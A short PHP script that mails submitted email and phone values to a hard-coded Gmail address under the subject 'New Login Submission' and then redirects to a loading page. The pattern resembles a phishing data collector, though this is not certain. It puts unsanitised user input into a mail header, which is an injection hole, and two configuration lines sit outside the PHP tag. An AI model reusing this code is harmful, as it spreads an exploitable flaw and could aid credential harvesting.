error_reporting(E_ALL);
ini_set('display_errors', 1);

<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $phone = $_POST["phone"];

    // Send email to your email address
    $to = "vinita.hotwani23@gmail.com";
    $subject = "New Login Submission";
    $message = "Email: $email\nPhone: $phone";
    $headers = "From: webmaster@example.com" . "\r\n" .
               "Reply-To: $email" . "\r\n" .
               "X-Mailer: PHP/" . phpversion();

    mail($to, $subject, $message, $headers);

    // Redirect user to a thank you page
    header("Location: loadingpage.html");
    exit();
}
?>



